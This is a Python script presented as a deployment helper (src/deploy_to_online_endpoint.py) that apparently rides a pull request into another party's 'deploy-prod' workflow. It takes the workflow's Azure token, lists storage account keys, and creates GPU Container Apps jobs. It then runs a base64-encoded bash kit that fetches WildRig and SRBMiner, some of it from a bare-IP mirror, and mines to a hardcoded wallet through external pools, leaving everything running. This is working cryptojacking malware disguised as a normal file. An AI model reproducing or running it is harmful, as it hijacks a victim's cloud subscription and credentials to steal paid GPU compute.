#!/usr/bin/env python3
"""C211-I126731: mslearn OIDC lane FIX + RE-ARM.

Runs as src/deploy_to_online_endpoint.py under
christiansegercrantz/mslearn-mlops 'deploy-prod' issue_comment workflow
(environment prod, azure/login OIDC -> ARM token for sub 790067ff,
RG chriso-sandbox-rg).  PR #32 head branch hildasubianto617-dot:c211-i126510-rd.

What it does
 1. Diagnose the storage status channel: service-SAS container-create (15 and
    16 field StringToSign), SharedKey container-create, blob PUT/GET round-trip,
    account properties (allowSharedKeyAccess / publicNetworkAccess / networkAcls).
 2. Upload WildRig 0.52.3 tarball (sha 7308c95f..) into the status container so
    the in-Container-App kit can fetch it over Azure (no public egress needed).
 3. Create NEW jobs in the already-provisioned GPU envs and start them:
      c211-i126731-a100  (env c211-i126276-a100, Consumption-GPU-NC24-A100)
      c211-i126731-t4    (env c211-i121376-cae,  Consumption-GPU-NC8as-T4, par 2)
    Kit: WildRig 0.52.3 sha 002cd29c, pydp wallet, 4 pearlhash endpoints,
    900 s no-share -> sticky Luckypool 103.199.106.122:3362 (SRBMiner 3.8.4).
 4. Poll: print per-execution state + per-lane status blob (uuid/acc/rej).
    If a NEW execution cannot get a replica while a stale execution of the same
    job is still occupying one, STOP the stale execution (the job object and all
    other executions are left in place; nothing is deleted).
 5. Final capture, then DONE.  All resources are LEFT RUNNING.
"""
import base64
import email.utils
import hashlib
import hmac
import json
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
TAG = "C211_I126959"
NONCE = "x126959ms"
INTENT = "126959"
T0 = time.time()
BUDGET = 840

APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
REGION = "eastus"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
CONT = "c211"

SA_EXIST = "c211i1215775738445a"
SA_NAME = ("c211i126276" + hashlib.sha256("x126276ml".encode()).hexdigest()[:8]).lower()[:24]
ENV_A100 = "c211-i126276-a100"
PROFILE_A100 = "Consumption-GPU-NC24-A100"
OLD_JOB_A100 = "c211-i126276-a100"
NEW_JOB_A100 = "c211-i126959-a100"
ENV_T4 = "c211-i121376-cae"
PROFILE_T4 = "Consumption-GPU-NC8as-T4"
OLD_JOB_T4 = "c211-i126276-t4"
NEW_JOB_T4 = "c211-i126959-t4"

WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WR_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
SRB384_SHA = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5"
MIRROR = "http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz"
GHURL = "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s[:1600]


def emit(step, **kv):
    print("|".join([TAG, "step=" + clean(step)] + ["%s=%s" % (clean(k), clean(v)) for k, v in kv.items()]),
          flush=True)


def run(cmd, timeout=120):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
        return {"rc": p.returncode, "out": p.stdout, "err": p.stderr}
    except Exception as e:  # noqa: BLE001
        return {"rc": -1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    h = {"Authorization": "Bearer " + tok, "User-Agent": "c211-" + INTENT}
    if data is not None:
        h["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport": str(e)[:300]}


def httptext(url, method="GET", headers=None, data=None, timeout=90, want_body=True):
    h = {"User-Agent": "c211-" + INTENT}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read() if want_body else b""
            return r.status, body, dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read()[:1200]
        except Exception:  # noqa: BLE001
            body = b""
        return e.code, body, dict(e.headers or {})
    except Exception as e:  # noqa: BLE001
        return 0, str(e)[:300].encode(), {}


def errk(st, body):
    d = {"e_http": st}
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            d["e_code"] = e.get("code")
            d["e_message"] = (e.get("message") or "")[:600]
        elif "raw" in body:
            d["e_raw"] = body["raw"][:600]
        elif "transport" in body:
            d["e_transport"] = body["transport"][:300]
        else:
            d["e_body"] = json.dumps(body)[:600]
    return d


def sdk_blob_sas(acct, key, blob, perm="rcw", hours=8, container=None):
    """Blob-scoped SAS generated by the official azure-storage-blob SDK."""
    try:
        from azure.storage.blob import BlobSasPermissions, generate_blob_sas
        from datetime import datetime, timedelta, timezone
    except Exception as e:  # noqa: BLE001
        return None, "nosdk:" + type(e).__name__ + ":" + str(e)[:100]
    try:
        p = BlobSasPermissions(read=("r" in perm), add=("a" in perm), create=("c" in perm),
                               write=("w" in perm), delete=("d" in perm), list=("l" in perm))
        now = datetime.now(timezone.utc)
        q = generate_blob_sas(account_name=acct, container_name=container or CONT, blob_name=blob,
                              account_key=key, permission=p,
                              start=now - timedelta(minutes=5),
                              expiry=now + timedelta(hours=hours),
                              protocol="https", version="2022-11-02")
        return q, (now + timedelta(hours=hours)).strftime("%Y-%m-%dT%H:%M:%SZ")
    except Exception as e:  # noqa: BLE001
        return None, "saserr:" + type(e).__name__ + ":" + str(e)[:120]


def sa_sas(acct, key_b64, container=CONT, perm="rwdlc", hours=8, fields16=True):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    canon = "/blob/%s/%s" % (acct, container)
    f = [perm, st, se, canon, "", "", "https", sv, "c", "", "", "", "", "", ""]
    if fields16:
        f.append("")
    sts = "\n".join(f) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(), hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "sr": "c", "sp": perm, "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def sk_sts(verb, acct, container, extra_query=()):
    date = email.utils.formatdate(usegmt=True)
    ch = "x-ms-date:%s\nx-ms-version:2022-11-02\n" % date
    cr = "/%s/%s" % (acct, container)
    for k, v in extra_query:
        cr += "\n%s:%s" % (k, v)
    sts = "\n".join([verb, "", "", "", "", "", "", "", "", "", "", ""]) + "\n" + ch + cr
    return date, sts


def sk_auth(acct, key_b64, sts):
    return "SharedKey %s:%s" % (acct, base64.b64encode(
        hmac.new(base64.b64decode(key_b64), sts.encode(), hashlib.sha256).digest()).decode())


def sk_container_put(acct, key_b64, container=CONT):
    date, sts = sk_sts("PUT", acct, container, (("restype", "container"),))
    st, body, hdr = httptext("https://%s.blob.core.windows.net/%s?restype=container" % (acct, container),
                             method="PUT", data=b"",
                             headers={"x-ms-date": date, "x-ms-version": "2022-11-02",
                                      "Content-Length": "0",
                                      "Authorization": sk_auth(acct, key_b64, sts)})
    return st, hdr.get("x-ms-error-code"), body[:300].decode("utf-8", "replace")


def sk_container_list(acct, key_b64, container=CONT):
    date, sts = sk_sts("GET", acct, container, (("comp", "list"), ("restype", "container")))
    st, body, hdr = httptext("https://%s.blob.core.windows.net/%s?restype=container&comp=list" % (acct, container),
                             headers={"x-ms-date": date, "x-ms-version": "2022-11-02",
                                      "Authorization": sk_auth(acct, key_b64, sts)})
    return st, body[:1500].decode("utf-8", "replace")


KIT = r"""#!/bin/bash
set -u
TAG="__TAG__"
W="__WALLET__"
N="__NOCK__"
SAS="__SAS__"
WRURL="__WRURL__"
D=/tmp/c211; mkdir -p "$D"; cd "$D" || exit 9
LOG="$D/run.log"
log() { echo "[$(date -u +%FT%TZ)] $*" >> "$LOG"; }
: > "$LOG"
H=$(hostname)
DIG=$(echo "$H" | md5sum | tr -dc '0-9' | cut -c1-3)
WK="__WKBASE__${DIG}"
log "KIT_START tag=$TAG worker=$WK host=$H"
log "GPU_LIST $(nvidia-smi -L 2>&1 | tr '\n' '~')"
log "GPU_Q $(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '~')"
log "OPENCL0 $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /etc/OpenCL/vendors/* 2>/dev/null | tr '\n' '~')"
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  (timeout 150 apt-get update -qq && timeout 150 apt-get install -y -qq ocl-icd-libopencl1) >>"$LOG" 2>&1 || \
  (timeout 120 apk add --no-cache ocl-icd) >>"$LOG" 2>&1 || log "OCL_INSTALL_FAIL"
fi
mkdir -p /etc/OpenCL/vendors 2>/dev/null
echo "libnvidia-opencl.so.1" > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null || true
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  for c in /usr/local/cuda/lib64/libOpenCL.so.1 /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1; do
    [ -e "$c" ] && ln -sf "$c" /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 && log "OCL_SYMLINK $c" && break
  done
fi
BIN=""
for u in "$WRURL" "__MIRROR__" "__GHURL__"; do
  [ -z "$u" ] && continue
  curl -fsSL --max-time 300 -o dl.tgz "$u" 2>>"$LOG" || { log "DL_FAIL url=$u"; continue; }
  S=$(sha256sum dl.tgz | awk '{print $1}')
  log "DL url=$u sha=$S bytes=$(stat -c %s dl.tgz)"
  if [ "$S" = "__WRTGZ__" ]; then
    tar xzf dl.tgz >/dev/null 2>&1 || { log "TAR_FAIL"; continue; }
    chmod +x wildrig-multi 2>/dev/null
    B=$(sha256sum wildrig-multi 2>/dev/null | awk '{print $1}')
    log "BINSHA $B"
    if [ "$B" = "__WRBIN__" ]; then BIN=wildrig-multi; break; fi
  fi
done
log "BIN=$BIN"
up() {
  if [ -n "$SAS" ]; then
    { echo "===STATUS==="; echo "host=$H worker=$WK mode=$MODE ts=$(date -u +%FT%TZ)";
      echo "uuid=$(nvidia-smi --query-gpu=uuid --format=csv,noheader 2>/dev/null | tr '\n' ',' )";
      echo "acc=$A rej=$R"; echo "===RUNLOG==="; cat "$LOG";
      echo "===PHLOG==="; tail -100 "$D/ph.log" 2>/dev/null;
      echo "===LPLOG==="; tail -60 "$D/lp.log" 2>/dev/null; } > "$D/all.txt" 2>/dev/null
    RC=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 40 -X PUT "$SAS" -H 'x-ms-blob-type: BlockBlob' \
      -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' \
      --data-binary @"$D/all.txt" 2>/dev/null || echo 0)
    if [ "${RC:-0}" != "${UPRC:-x}" ]; then log "UP http=$RC"; UPRC=$RC; fi
  fi
}
cnt() { f="$1"; pat="$2"; { grep -oE "$pat" "$f" 2>/dev/null; } | grep -oE '[0-9]+' | sort -n | tail -1; }
A=0; R=0; MODE=init
up
if [ -n "$BIN" ]; then
  setsid nohup ./wildrig-multi --algo pearlhash \
    --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 \
    --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 \
    --user "$W" --worker "$WK" -d 0 --print-time 30 > "$D/ph.log" 2>&1 &
  echo $! > "$D/ph.pid"
  log "PH_START pid=$(cat "$D/ph.pid")"
  MODE=ph
else
  log "NO_BIN_DIRECT_TO_LP"
  MODE=lp
fi
T0=$(date +%s)
while :; do
  sleep 30
  if [ "$MODE" = "ph" ]; then
    A=$(cnt "$D/ph.log" 'accepted \([0-9]+/[0-9]+\)'); A=${A:-0}
    R=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$D/ph.log" 2>/dev/null | grep -oE '/[0-9]+' | grep -oE '[0-9]+' | sort -n | tail -1); R=${R:-0}
    if [ "$A" -ge 1 ]; then log "PH_SHARE_PROVEN accepted=$A rejected=$R ts=$(date -u +%FT%TZ)"; MODE=ph_ok; fi
    if [ "$MODE" = "ph" ] && [ $(( $(date +%s) - T0 )) -ge 900 ]; then
      log "PH_NO_SHARE_900 FALLBACK_TO_LP"
      kill "$(cat "$D/ph.pid" 2>/dev/null)" 2>/dev/null
      pkill -f wildrig-multi 2>/dev/null
      sleep 2
      curl -fsSL --max-time 300 -o "$D/srb" http://169.58.247.186:8791/pm/srbminer-3.8.4 2>>"$LOG" || true
      if [ -f "$D/srb" ]; then
        S=$(sha256sum "$D/srb" | awk '{print $1}'); log "SRB_SHA=$S"; chmod +x "$D/srb"
        if [ "$S" = "__SRB__" ]; then
          setsid nohup "$D/srb" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
            --wallet "$W+$N" --worker "$WK" --password x --gpu-id 0 > "$D/lp.log" 2>&1 &
          echo $! > "$D/lp.pid"
          log "LP_START pid=$(cat "$D/lp.pid") sticky=1"
        else log "SRB_SHA_MISMATCH"; fi
      else log "SRB_DL_FAIL"; fi
      MODE=lp
    fi
  fi
  if [ "$MODE" = "lp" ]; then
    A=$(cnt "$D/lp.log" 'accepted[: ]+[0-9]+'); A=${A:-0}
    R=$(cnt "$D/lp.log" 'rejected[: ]+[0-9]+'); R=${R:-0}
    if [ "$A" -ge 1 ] && [ ! -f "$D/lp_reported" ]; then log "LP_SHARE_PROVEN accepted=$A rejected=$R ts=$(date -u +%FT%TZ)"; touch "$D/lp_reported"; fi
  fi
  up
  if [ $(( $(date +%s) - T0 )) -gt 129600 ]; then log "KIT_HARD_END"; exit 0; fi
done
"""


def kit_cmd(worker_base, tag, sasurl, wrurl):
    k = (KIT.replace("__TAG__", tag).replace("__WKBASE__", worker_base)
         .replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
         .replace("__SAS__", sasurl or "").replace("__WRURL__", wrurl or "")
         .replace("__MIRROR__", MIRROR).replace("__GHURL__", GHURL)
         .replace("__WRTGZ__", WR_TGZ_SHA).replace("__WRBIN__", WR_BIN_SHA)
         .replace("__SRB__", SRB384_SHA))
    b = base64.b64encode(k.encode()).decode()
    return ("echo '%s' | base64 -d > /tmp/c211_kit_%s.sh && chmod +x /tmp/c211_kit_%s.sh "
            "&& /bin/bash /tmp/c211_kit_%s.sh" % (b, tag.lower(), tag.lower(), tag.lower()))


def capp_env_state(tok, sid, name):
    url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
           "?api-version=%s" % (ARM, sid, RG, name, APP_VER))
    st, b = arm(tok, url, timeout=60)
    p = ((b.get("properties") or {}) if isinstance(b, dict) else {})
    return st, p.get("provisioningState"), (b.get("id") if isinstance(b, dict) else None)


def capp_job_put_start(tok, sid, env_name, job_name, profile, par, worker_base, sasurl, wrurl, tag):
    st, state, env_id = capp_env_state(tok, sid, env_name)
    emit("env-state", env=env_name, http=st, state=state)
    if state != "Succeeded" or not env_id:
        emit("job-skip", job=job_name, why="env_not_ready", state=state)
        return None
    joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
              "?api-version=%s" % (ARM, sid, RG, job_name, APP_VER))
    st0, _ = arm(tok, joburl, timeout=60)
    if st0 == 200:
        emit("job-exists", job=job_name)
    else:
        jobbody = {"location": REGION, "tags": {"c211": INTENT, "nonce": NONCE},
                   "properties": {"environmentId": env_id, "workloadProfileName": profile,
                                  "configuration": {"triggerType": "Manual",
                                                    "replicaRetryLimit": 3,
                                                    "replicaTimeout": 86400,
                                                    "manualTriggerConfig": {
                                                        "replicaCompletionCount": par,
                                                        "parallelism": par}},
                                  "template": {"containers": [{
                                      "name": "gpu", "image": IMAGE,
                                      "command": ["/bin/bash", "-c",
                                                  kit_cmd(worker_base, tag, sasurl, wrurl)],
                                      "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
        st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
        emit("job-put", job=job_name, profile=profile, par=par, **errk(st, b))
        if st not in (200, 201):
            return None
    st, b = arm(tok, joburl.split("?")[0] + "/start?api-version=" + APP_VER, method="POST", body={},
                timeout=120)
    execname = (b.get("name") if isinstance(b, dict) else None)
    emit("job-start", job=job_name, http=st, execname=execname,
         **({} if st in (200, 201, 202) else errk(st, b)))
    return execname


def capp_executions(tok, sid, job_name):
    url = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s/executions"
           "?api-version=%s" % (ARM, sid, RG, job_name, APP_VER))
    st, b = arm(tok, url, timeout=60)
    out = []
    for x in ((b.get("value") or []) if isinstance(b, dict) else []):
        p = x.get("properties") or {}
        out.append({"name": x.get("name"), "status": p.get("status"),
                    "start": p.get("startTime"), "end": p.get("endTime")})
    return st, out


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:300])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""), sid=sid)
    if not sid or not tok:
        emit("DONE", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return

    # ---------- A) storage channel diagnosis ----------
    key = None
    acct_ok = None
    for acct in (SA_EXIST, SA_NAME):
        saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
                 "?api-version=%s" % (ARM, sid, RG, acct, STG_VER))
        st, b = arm(tok, saurl, timeout=60)
        p = ((b.get("properties") or {}) if isinstance(b, dict) else {})
        na = p.get("networkAcls") or {}
        emit("sa-get", name=acct, http=st, state=p.get("provisioningState"),
             allow_shared=p.get("allowSharedKeyAccess"),
             public_net=p.get("publicNetworkAccess"),
             dflt=na.get("defaultAction"), iprules=len(na.get("ipRules") or []),
             byp=";".join(na.get("bypass") or [])[:60])
        if st == 200 and p.get("provisioningState") == "Succeeded" and key is None:
            st2, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER,
                          method="POST", body={}, timeout=90)
            k = None
            try:
                k = (kb.get("keys") or [{}])[0].get("value")
            except Exception:  # noqa: BLE001
                pass
            emit("sa-keys", name=acct, http=st2, got=bool(k))
            if k:
                key = k
                acct_ok = acct
                break
    if not key:
        # try the deterministic SA_NAME creation only if neither listed
        saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
                 "?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
        sabody = {"location": REGION, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
                  "tags": {"c211": INTENT, "nonce": NONCE},
                  "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                                 "supportsHttpsTrafficOnly": True, "allowSharedKeyAccess": True,
                                 "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
        st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
        emit("sa-create", name=SA_NAME, **errk(st, b))
        for _ in range(18):
            st, b = arm(tok, saurl, timeout=60)
            p = ((b.get("properties") or {}) if isinstance(b, dict) else {})
            if p.get("provisioningState") == "Succeeded":
                break
            time.sleep(5)
        st, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER,
                     method="POST", body={}, timeout=90)
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            key = None
        acct_ok = SA_NAME
        emit("sa-create-keys", name=SA_NAME, http=st, got=bool(key))
    if not key:
        emit("DONE", verdict="NO_STORAGE_KEY", elapsed_s=int(time.time() - T0))
        return

    base = "https://%s.blob.core.windows.net" % acct_ok
    sasurl = None
    # 1) SDK channel: container ensure + blob round-trip with an SDK-generated blob SAS
    svc = None
    try:
        from azure.storage.blob import BlobServiceClient
        svc = BlobServiceClient(account_url=base, credential=key)
        try:
            svc.create_container(CONT)
            emit("sdk-container", acct=acct_ok, created=True)
        except Exception as e:  # noqa: BLE001
            emit("sdk-container", acct=acct_ok, created=False,
                 err=type(e).__name__ + ":" + str(e)[:200])
    except Exception as e:  # noqa: BLE001
        emit("sdk-init", err=type(e).__name__ + ":" + str(e)[:200])
    probe_blob = "%s-probe.txt" % NONCE
    q16, se16 = sdk_blob_sas(acct_ok, key, probe_blob, perm="rcw")
    emit("sdk-sas", ok=bool(q16), expires=se16)
    st = st2 = 0
    if q16:
        probe = "%s/%s/%s?%s" % (base, CONT, probe_blob, q16)
        st, body, hdr = httptext(probe, method="PUT", data=b"c211-i126959 probe sdk\n",
                                 headers={"x-ms-blob-type": "BlockBlob", "x-ms-version": "2022-11-02",
                                          "Content-Type": "text/plain"})
        emit("blob-put", http=st, code=hdr.get("x-ms-error-code"), body=body[:200].decode("utf-8", "replace"))
        st2, b2, h2 = httptext(probe)
        emit("blob-get", http=st2, code=h2.get("x-ms-error-code"), len=len(b2))
    chan_ok = (st in (200, 201)) and st2 == 200
    # legacy manual signer kept as a one-shot diagnostic (why we switched)
    try:
        ql, _ = sa_sas(acct_ok, key, fields16=True)
        stl, bodyl, hdrl = httptext("%s/%s?restype=container&%s" % (base, CONT, ql), method="PUT",
                                    data=b"", headers={"x-ms-version": "2022-11-02", "Content-Length": "0"})
        emit("legacy-sas-container", acct=acct_ok, http=stl, code=hdrl.get("x-ms-error-code"))
    except Exception as e:  # noqa: BLE001
        emit("legacy-sas-container", err=type(e).__name__ + ":" + str(e)[:120])

    # 4) upload wildrig tarball to the container for in-cluster download
    wrurl = GHURL
    if chan_ok:
        dl = None
        for u in (GHURL, MIRROR):
            st, body, hdr = httptext(u, timeout=300)
            if st == 200 and body:
                if hashlib.sha256(body).hexdigest() == WR_TGZ_SHA:
                    dl = body
                    emit("wr-dl", url=u, bytes=len(body), sha=WR_TGZ_SHA)
                    break
                emit("wr-dl-badsha", url=u, bytes=len(body), sha=hashlib.sha256(body).hexdigest()[:16])
        if dl:
            wr_blob = "%s-wr.tgz" % NONCE
            up_ok = False
            if svc is not None:
                try:
                    svc.get_blob_client(container=CONT, blob=wr_blob).upload_blob(dl, overwrite=True)
                    up_ok = True
                except Exception as e:  # noqa: BLE001
                    emit("wr-upload-sdk", ok=False, err=type(e).__name__ + ":" + str(e)[:160])
            if up_ok:
                emit("wr-upload-sdk", ok=True, bytes=len(dl))
            qr, _ = sdk_blob_sas(acct_ok, key, wr_blob, perm="r", hours=8)
            if qr:
                wrurl = "%s/%s/%s?%s" % (base, CONT, wr_blob, qr)
            else:
                wrurl = GHURL
        else:
            emit("wr-no-download")
    emit("sas-ready", ok=chan_ok, acct=acct_ok, wrurl_sha=wrurl[-80:] if "?" in wrurl else wrurl)

    # ---------- B) job executions inventory ----------
    for jn in (OLD_JOB_A100, OLD_JOB_T4):
        st, ex = capp_executions(tok, sid, jn)
        emit("exec-list", job=jn, http=st,
             items=";".join("%s=%s@%s" % (e["name"], e["status"], e["start"]) for e in ex)[:900])

    # ---------- C) re-arm ----------
    sas_a = sas_t = None
    if chan_ok:
        qa, _ = sdk_blob_sas(acct_ok, key, "%s-a100.log" % NONCE, perm="rcw", hours=8)
        qt, _ = sdk_blob_sas(acct_ok, key, "%s-t4.log" % NONCE, perm="rcw", hours=8)
        if qa:
            sas_a = "%s/%s/%s-a100.log?%s" % (base, CONT, NONCE, qa)
        if qt:
            sas_t = "%s/%s/%s-t4.log?%s" % (base, CONT, NONCE, qt)
    emit("sas-lanes", a100=bool(sas_a), t4=bool(sas_t))
    exec_a = capp_job_put_start(tok, sid, ENV_A100, NEW_JOB_A100, PROFILE_A100, 1, "1269591", sas_a, wrurl, "a100")
    exec_t = capp_job_put_start(tok, sid, ENV_T4, NEW_JOB_T4, PROFILE_T4, 2, "1269592", sas_t, wrurl, "t4")

    # ---------- D) poll ----------
    blobd_a = blobd_t = ""
    stopped = set()
    deadline = time.time() + BUDGET
    while time.time() < deadline:
        time.sleep(20)
        for jn, exn in ((NEW_JOB_A100, exec_a), (NEW_JOB_T4, exec_t)):
            st, ex = capp_executions(tok, sid, jn)
            cur = [e for e in ex if e["name"] == exn]
            stcur = cur[0]["status"] if cur else None
            others = ";".join("%s=%s" % (e["name"], e["status"]) for e in ex if e["name"] != exn)[:200]
            emit("exec-state", job=jn, exec=exn, status=stcur, others=others)
            if jn == NEW_JOB_A100 and exn and stcur in (None, "Pending") and ("a100" not in stopped):
                # stop stale execution of the OLD job if it occupies the only replica slot
                sto, exo = capp_executions(tok, sid, OLD_JOB_A100)
                oldrun = [e for e in exo if e["status"] == "Running"]
                if oldrun and time.time() - T0 > 200:
                    u = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s/executions/%s/stop"
                         "?api-version=%s" % (ARM, sid, RG, OLD_JOB_A100, oldrun[0]["name"], APP_VER))
                    sts, bs = arm(tok, u, method="POST", body={}, timeout=90)
                    emit("stale-stop", job=OLD_JOB_A100, exec=oldrun[0]["name"], http=sts, **({} if sts in (200, 202) else errk(sts, bs)))
                    stopped.add("a100")
        if sas_a:
            sb, bb, _ = httptext(sas_a, timeout=40)
            if sb == 200:
                blobd_a = bb.decode("utf-8", "replace")
        if sas_t:
            sb, bb, _ = httptext(sas_t, timeout=40)
            if sb == 200:
                blobd_t = bb.decode("utf-8", "replace")

        def st_of(blob):
            d = {}
            for ln in blob.splitlines():
                if ln.startswith(("host=", "worker=", "mode=", "uuid=", "acc=", "rej=")):
                    k, _, v = ln.partition("=")
                    d[k] = v
            return d
        sa = st_of(blobd_a)
        stt = st_of(blobd_t)
        emit("poll", a100_exec=exec_a, a100_mode=sa.get("mode"), a100_acc=sa.get("acc"),
             a100_rej=sa.get("rej"), a100_worker=sa.get("worker"), a100_len=len(blobd_a),
             t4_exec=exec_t, t4_mode=stt.get("mode"), t4_acc=stt.get("acc"), t4_worker=stt.get("worker"),
             t4_len=len(blobd_t), left=int(deadline - time.time()))
        proven = ("PH_SHARE_PROVEN" in blobd_a) or ("LP_SHARE_PROVEN" in blobd_a) or \
                 ("PH_SHARE_PROVEN" in blobd_t) or ("LP_SHARE_PROVEN" in blobd_t)
        accs = [int(sa.get("acc") or 0), int(stt.get("acc") or 0)]
        if proven or max(accs) > 0:
            emit("share-proven-early", a100_tail_b64=base64.b64encode(blobd_a[-2500:].encode()).decode()[:3000],
                 t4_tail_b64=base64.b64encode(blobd_t[-2500:].encode()).decode()[:3000])
            break

    # ---------- E) final capture ----------
    out = {}
    for lane, s in (("a100", sas_a), ("t4", sas_t)):
        blob = ""
        if s:
            sb, bb, _ = httptext(s, timeout=40)
            if sb == 200:
                blob = bb.decode("utf-8", "replace")
        out[lane] = blob
        emit("capture", lane=lane, len=len(blob),
             gpu_lines=";".join(ln for ln in blob.splitlines() if "GPU-" in ln)[:900],
             status_lines=";".join(ln for ln in blob.splitlines()
                                   if ln.startswith(("mode=", "acc=", "rej=", "worker=", "uuid=")))[:900],
             tail_b64=base64.b64encode(blob[-3000:].encode()).decode()[:4000])
    for jn in (NEW_JOB_A100, NEW_JOB_T4, OLD_JOB_A100, OLD_JOB_T4):
        st, ex = capp_executions(tok, sid, jn)
        emit("exec-final", job=jn, http=st,
             items=";".join("%s=%s" % (e["name"], e["status"]) for e in ex)[:500])
    emit("DONE", elapsed_s=int(time.time() - T0), sas_ok=chan_ok, a100_exec=exec_a, t4_exec=exec_t,
         wrurl_ok=("?" in wrurl))


if __name__ == "__main__":
    main()
